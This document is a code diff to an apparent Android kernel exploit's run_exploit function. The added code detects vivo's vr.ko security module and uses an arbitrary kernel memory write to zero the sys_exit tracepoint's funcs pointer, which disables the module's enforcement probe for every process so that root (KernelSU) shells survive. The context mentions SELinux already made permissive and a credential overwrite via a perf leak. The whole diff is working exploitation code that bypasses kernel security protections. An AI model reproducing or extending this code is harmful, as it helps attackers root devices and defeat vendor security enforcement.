@@ -1116,6 +1116,48 @@ static int verify_seccomp_probe_stage(void *context) {
   return 1;
 }
 
+/* offsetof(struct tracepoint, funcs) is not constant across KMIs: 6.6
+ * inserted __probestub before regfunc, pushing funcs 0x40 -> 0x48. Writing
+ * the 6.1 offset on a 6.6 kernel clobbers unregfunc and is a silent no-op. */
+static uint32_t tracepoint_funcs_off(void) {
+  const char *r = active_offsets ? active_offsets->uname_r : NULL;
+  unsigned maj = 0, min = 0;
+  if (!r || sscanf(r, "%u.%u", &maj, &min) != 2) {
+    pr_warning("vr global: cannot parse KMI '%s'; assuming 6.1 layout\n",
+               r ? r : "(null)");
+    return TRACEPOINT_FUNCS_OFF_6_1;
+  }
+  if (maj > 6 || (maj == 6 && min >= 6)) return TRACEPOINT_FUNCS_OFF_6_6;
+  return TRACEPOINT_FUNCS_OFF_6_1;
+}
+
+/* Zero __tracepoint_sys_exit.funcs so vr.ko's sys_exit kill probe never
+ * fires, for every process including ksud and its shells. The tracepoint
+ * iterator skips NULL funcs; the commit_creds probe still runs but nothing
+ * acts on the tags. Needs SELinux already permissive and the entry to carry
+ * off_vr_sys_exit_tp. */
+static void neutralize_vr_global(void) {
+  if (!active_offsets || !active_offsets->off_vr_sys_exit_tp) {
+    pr_warning("vr global: vr.ko loaded but off_vr_sys_exit_tp unset "
+               "(kernel %s has no offset entry); KSU shells will die\n",
+               active_offsets ? active_offsets->uname_r : "(no offsets)");
+    return;
+  }
+  uint32_t funcs_off = tracepoint_funcs_off();
+  uintptr_t tp =
+      data_addr(KIMAGE_TEXT_BASE + active_offsets->off_vr_sys_exit_tp);
+  pr_info("vr global: tp=0x%016zx funcs_off=0x%x\n", (size_t)tp, funcs_off);
+  for (int attempt = 1; attempt <= 5; attempt++) {
+    if (do_one_write(tp + funcs_off, "VR-global: sys_exit tp->funcs", 1, 1)) {
+      pr_success("vr.ko sys_exit probe disabled (attempt %d)\n", attempt);
+      return;
+    }
+    pr_warning("vr global: attempt %d failed\n", attempt);
+    usleep(50000);
+  }
+  pr_warning("vr global: all attempts failed; KSU shells may die\n");
+}
+
 static int verify_leaf_dir_stage(void *context) {
   struct w3_stage_context *stage = context;
   if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;
@@ -1196,6 +1238,31 @@ int run_exploit(int argc, char **argv) {
     TIMER("Write 1 complete");
   } else {
     pr_success("SELinux already permissive\n");
+  }
+
+  /* vivo vr.ko: kill the sys_exit enforcement probe globally now that
+   * SELinux is permissive, before the W2 child exists. Entry-gated via
+   * off_vr_sys_exit_tp, so non-vivo kernels are untouched. */
+  {
+    int vr_loaded = 0;
+    FILE *mf = fopen("/proc/modules", "r");
+    if (!mf) {
+      /* unreadable under some SELinux configs; entries carrying the
+       * tracepoint offset are vivo targets, assume loaded */
+      vr_loaded = active_offsets && active_offsets->off_vr_sys_exit_tp;
+    } else {
+      char mod[256];
+      while (fgets(mod, sizeof(mod), mf)) {
+        if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_')) {
+          vr_loaded = 1;
+          break;
+        }
+      }
+      fclose(mf);
+    }
+    if (vr_loaded) {
+      neutralize_vr_global();
+    }
   }
 
   /* W2: overwrite the child credential via the task leaked by perf. */
